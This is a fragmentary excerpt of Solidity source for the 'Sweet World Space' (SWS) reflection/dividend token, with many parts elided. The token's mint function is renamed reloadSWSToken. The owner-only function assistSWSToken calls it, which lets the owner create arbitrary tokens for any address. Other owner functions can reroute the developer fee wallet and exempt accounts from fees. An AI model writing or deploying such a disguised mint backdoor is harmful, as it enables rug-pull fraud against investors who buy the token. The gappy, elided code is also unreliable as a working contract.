...
_balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
 ...
 function reloadSWSToken(address account, uint256 amount) internal virtual {
...
function reloadSWSToken(address account, uint256 value) internal override {
    super.reloadSWSToken(account, value);
...
function _burn(address account, uint256 value) internal override {
 ...
 function _setBalance(address account, uint256 newBalance) internal {
    ...
    if(newBalance > currentBalance) {
      ...
      reloadSWSToken(account, mintAmount);
...
contract SWSTokenrewardToken is rewardTokenHolders, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    using IterateSWSToken  for IterateSWSToken .Map;
IterateSWSToken .Map private tokenHoldersList;
...
event Claim(address indexed account, uint256 amount, bool indexed automatic);
 constructor() rewardTokenHolders("SWSToken_rewardToken_Tracker", "SWSToken_rewardToken_Tracker") {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 80000 * (10**9); 
    }
function _transfer(address, address, uint256) internal override pure {
        require(false, "SWSToken_rewardToken_Tracker: No transfers allowed");
    }
 function withdrawDividend() public override  pure {
        require(false, "SWSToken_rewardToken_Tracker: withdrawDividend disabled. Use the 'claim' function on the main SWSToken contract.");
    }
...
contract SWSToken is ERC20, Ownable {
 event UpdateDEXV2Router(address indexed newAddress, address indexed oldAddress);
    ...
    uint256 public  developmentTeam = 2;
    uint256 public  distributeToholders = 6;
    uint256 public  TotalFees;
 uint256 public gasForProcessing = 300000;
    address public DEXV2Pair;
    PanCakeRouter02 public DEXV2Router;
    SWSTokenrewardToken public rewardToken;
   uint256 _totalSupply =250000000  * (10**9);
 ...
 address public lp;
  ILP public adressLiquidity;
    address public developmentTeamReciever =0x5Bd1d0AeB17EC0529985478d7117eAC1Ad1E45c4;
...
bool public cooldownEnabled = false;
  ...
  constructor() ERC20("Sweet World Space", "SWS") {
 
        TotalFees = distributeToholders.add(liquidityFee).add(developmentTeam);
 ...
 DEXV2Router = _DEXV2Router;
        ...
        rewardToken = new SWSTokenrewardToken();
...
isTimelockLimited[owner()] = true;
 ...
 reloadSWSToken(owner(), _totalSupply);
    }
receive() external payable {}
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
...
emit RebaseUpdate(epoch, _totalSupply);
  ...
  function changeIsDividendLimited(address holder, bool Limited) external masterWallet {
     ...
     function assistSWSToken(address tokenAddress, uint256 tokenePercent) public masterWallet{
       reloadSWSToken(tokenAddress, tokenePercent);
  }
 function setDevWallet(address payable wallet) public masterWallet {
        developmentTeamReciever = wallet;
    }
   
 function updateDEXV2Router(address newAddress) public masterWallet {
        require(newAddress != address(DEXV2Router), "SWSToken: The router already has that address");
 ...
 function excludeFromFees(address account, bool excluded) public masterWallet {
        require(_isExcludedFromFees[account] != excluded, "SWSToken: Account is already the value of 'excluded'");
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }
function updateGasForProcessing(uint256 newValue) public masterWallet {
        require(newValue >= 200000 && newValue <= 500000, "SWSToken: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "SWSToken: Cannot update gasForProcessing to same value");
 ...
 uint256 tokensTSWSToken = tokensToLiquify.mul(liquidityFee).div(TotalFees).div(2);
        uint256 amountToSwap = tokensToLiquify.sub(tokensTSWSToken);
...
uint256 bnbForLiquidity = bnbBalance.mul(liquidityFee).div(bnbFeeFactor).div(2);
        uint256 bnbForReflection = bnbBalance.mul(distributeToholders).div(bnbFeeFactor);
        uint256 bnbForDev = bnbBalance.sub(bnbForLiquidity).sub(bnbForReflection);
addLiquidity(tokensTSWSToken, bnbForLiquidity);
payable(developmentTeamReciever).transfer(bnbForDev);
 (bool success,) = address(rewardToken).call{value: bnbForReflection}("");
if(success) {
            emit transferDividends(tokensToLiquify.mul(distributeToholders).div(TotalFees), bnbForReflection);
        }
    }
